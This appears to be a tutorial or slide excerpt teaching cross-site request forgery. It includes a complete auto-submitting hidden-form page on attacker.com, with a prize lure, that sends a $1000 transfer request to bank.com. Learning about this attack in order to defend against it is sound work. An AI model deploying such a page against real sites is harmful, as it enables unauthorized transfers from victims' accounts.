Crafting the Payload

Embedding Forged Requests

The attacker creates a forged request designed to perform a sensitive action on the legitimate web application. This request is then embedded on an attacker-controlled website.

  • Often uses HTML elements like <img>, hidden <form>, or <iframe>.
  • The request targets a sensitive endpoint on the victim's authenticated site.
  • The goal is to trigger an action without the victim's explicit interaction.
Example: Hidden Form

Auto-Submitting a Transfer

A common technique is to use a hidden HTML form that automatically submits itself via JavaScript when the malicious page loads. This sends a POST request with predefined parameters.

Malicious HTML on attacker.com
<!DOCTYPE html> <html> <head><title>Malicious Site</title></head> <body> <h1>You've Won a Prize!</h1> <p>Click anywhere to claim your reward!</p> <!-- Hidden CSRF form targeting bank.com --> <form action="http://bank.com/transfer" method="POST" id="csrf_form"> <input type="hidden" name="amount" value="1000"> <input type="hidden" name="to" value="attacker_account"> </form> <script> // Automatically submit the form document.getElementById('csrf_form').submit(); </script> </body> </html>
Key Takeaway

Attackers craft forged requests and embed them in their own sites, using hidden HTML elements to trigger sensitive actions on the victim's behalf.
